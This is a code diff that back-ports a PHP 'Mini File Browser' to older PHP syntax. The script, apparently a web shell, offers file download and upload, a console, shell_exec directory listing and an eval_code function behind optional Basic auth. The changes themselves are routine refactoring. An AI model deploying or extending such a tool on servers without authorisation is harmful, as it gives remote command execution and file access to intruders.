@@ -40,7 +40,8 @@ $base64_paths = false;
 
 /* authentification */
 if ($pass) {
-  if (empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != explode(":", $pass)[0] || hash('sha256', $salt . $_SERVER['PHP_AUTH_PW']) != explode(":", $pass)[1]) {
+  $pass = explode(":", $pass);
+  if (empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != $pass[0] ||  hash('sha256', $salt . $_SERVER['PHP_AUTH_PW']) != $pass[1]) {
     header('WWW-Authenticate: Basic realm="Mini File Browser"');
     header('HTTP/1.0 401 Unauthorized');
     die('unauthorized!');
@@ -111,7 +112,8 @@ function main($dir, $download, $upload, $read, $console, $method, $base64_paths)
       break;
     default:
       $files = list_directory_php($dir);
-      if (is_enabled('shell_exec')[1] === 'b')
+      $r = is_enabled('shell_exec');
+      if ($r[1] === 'b')
         echo "<p>File browsing: <a href='" . modify_url('m', 'shell_exec') . "'>switch to shell_exec</a></p>";
       break;
   }
@@ -191,7 +193,7 @@ function main($dir, $download, $upload, $read, $console, $method, $base64_paths)
 function list_directory_php($dir)
 {
   $files = scandir($dir);
-  $fileList = [];
+  $fileList = array();
   foreach ($files as $file) {
 
     $real = @realpath($dir . DIRECTORY_SEPARATOR . $file);
@@ -213,14 +215,16 @@ function list_directory_php($dir)
 
     $owner = '';
     if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
-      $owner = posix_getpwuid(fileowner($real))['name'] . ":" . posix_getgrgid(fileowner($real))['name'];
+      $pwuid = posix_getpwuid(fileowner($real));
+      $grgid = posix_getgrgid(fileowner($real));
+      $owner = $pwuid['name'] . ":" . $grgid['name'];
     }
 
     $time = date('Y-m-d H:i:s', filemtime($real));
     $size = is_dir($real) ? '' : FileSizeConvert(filesize($real));
     $base64 = f('is_readable',$real) && !$isDir ? base64_encode($real) : '';
 
-    $fileList[] = [
+    $fileList[] = array(
       'name' => $file,
       'path' => $real,
       'isDir' => $isDir,
@@ -230,7 +234,7 @@ function list_directory_php($dir)
       'time' => $time,
       'size' => $size,
       'base64' => $base64
-    ];
+    );
   }
   return $fileList;
 }
@@ -239,7 +243,7 @@ function list_directory_shell($dir)
 {
   $output = shell_exec("ls -la --time-style=full-iso " . escapeshellarg($dir));
   $lines = explode("\n", trim($output));
-  $fileList = [];
+  $fileList = array();
   foreach ($lines as $line) {
     $line = trim($line);
     if ($line === '' || strpos($line, 'total ') === 0)
@@ -259,11 +263,12 @@ function list_directory_shell($dir)
     if (strpos($perm, 'x') !== false)
       $my_perm .= 'X';
     $owner = $parts[2] . ':' . $parts[3];
-    $time = date('Y-m-d H:i:s', strtotime($parts[5] . ' ' . explode(".", $parts[6])[0]));
+    list($timePart) = explode(".", $parts[6]);
+    $time = date('Y-m-d H:i:s', strtotime($parts[5] . ' ' . $timePart));
     $size = $isDir ? '' : FileSizeConvert($parts[4]);
     $base64 = strpos($perm, 'r') !== false && !$isDir ? base64_encode($real) : '';
 
-    $fileList[] = [
+    $fileList[] = array(
       'name' => $file,
       'path' => $real,
       'isDir' => $isDir,
@@ -273,7 +278,7 @@ function list_directory_shell($dir)
       'time' => $time,
       'size' => $size,
       'base64' => $base64
-    ];
+    );
   }
   return $fileList;
 }
@@ -456,7 +461,7 @@ function eval_code($code)
 function emul_realpath($path)
 {
   $folders = explode('/', $path);
-  $stack = [];
+  $stack = array();
   foreach ($folders as $folder) {
     if ($folder === '..') {
       array_pop($stack);
@@ -482,7 +487,7 @@ function modify_url($key, $value)
 
 function FileSizeConvert($bytes)
 {
-  $units = ["TB" => pow(1024, 4), "GB" => pow(1024, 3), "MB" => pow(1024, 2), "kB" => 1024, "B" => 1];
+  $units = array("TB" => pow(1024, 4), "GB" => pow(1024, 3), "MB" => pow(1024, 2), "kB" => 1024, "B" => 1);
   foreach ($units as $unit => $value) {
     if ($bytes >= $value) {
       return str_replace(".", ",", round($bytes / $value, 2)) . " " . $unit;
